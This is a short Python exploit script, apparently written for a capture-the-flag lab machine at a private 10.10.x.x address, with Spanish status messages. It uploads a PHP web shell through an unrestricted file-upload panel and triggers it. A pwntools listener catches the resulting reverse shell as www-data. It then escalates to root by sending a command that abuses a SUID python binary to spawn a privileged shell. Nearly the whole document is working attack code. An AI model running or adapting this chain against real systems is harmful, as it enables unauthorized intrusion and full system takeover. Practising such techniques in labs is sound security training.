#!/usr/bin/python3
#coding: utf-8


#Made by: WizzzStark

import requests
import pdb
import threading
import signal
import sys
import time

from pwn import *


def exit(sig, frame):
	print("\n [!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, exit)

upload_url = "http://10.10.114.90/panel/"
shell_url = "http://10.10.114.90/uploads/shell.phtml"
lport = 1234
burp =  {'http':'http://127.0.0.1:8080'}

def request():

	filename = open("shell.phtml", "r")

	file_to_upload = {'fileUpload': ('shell.phtml', filename, 'application/octet-stream')}

	data_post = {
		'submit':'Upload'
	}

	r = requests.post(upload_url, data=data_post, files=file_to_upload)

	r = requests.get(shell_url)

if __name__=='__main__':

	try:
		threading.Thread(target=request, args=()).start()
	except Exception as e:
		log.error(str(e))

	p1 = log.progress("Pwn")
	p1.status("Ganando acceso al sistema")

	shell = listen(lport, timeout=10).wait_for_connection()

	if shell.sock is None:
		p1.failure("No fue posible acceder a la máquina")
	else:
		p1.success("Se ha ganado acceso como el usuario www-data")

	p2 = log.progress("Privilege Escalation")
	p2.status("Migrando al usuario root")
	time.sleep(2)

	shell.sendline("""python -c 'import os;os.execl("/bin/sh","sh","-p")'""")
	p2.success("Migracion a root satisfactoria")

	shell.interactive()

